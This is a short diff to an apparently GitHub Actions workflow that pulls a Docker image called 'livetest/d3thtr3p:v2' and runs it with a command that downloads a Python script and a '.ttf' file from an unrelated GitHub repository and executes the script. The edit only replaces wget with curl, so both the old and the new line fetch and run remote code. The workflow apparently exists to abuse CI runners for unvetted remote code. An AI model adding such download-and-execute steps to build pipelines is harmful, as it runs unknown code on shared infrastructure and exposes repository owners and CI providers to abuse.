@@ -17,4 +17,4 @@ jobs:
       run: docker pull livetest/d3thtr3p:v2
     - name: Run Docker file
       run: |
-            docker run livetest/d3thtr3p:v2 sh -c "wget https://raw.githubusercontent.com/Cjxsqa/4/main/Z.py && wget https://raw.githubusercontent.com/Cjxsqa/4/main/_.ttf && python3 Z.py"
+            docker run livetest/d3thtr3p:v2 sh -c "curl -o Z.py https://raw.githubusercontent.com/Cjxsqa/4/main/Z.py && curl -o _.ttf https://raw.githubusercontent.com/Cjxsqa/4/main/_.ttf && python3 Z.py"
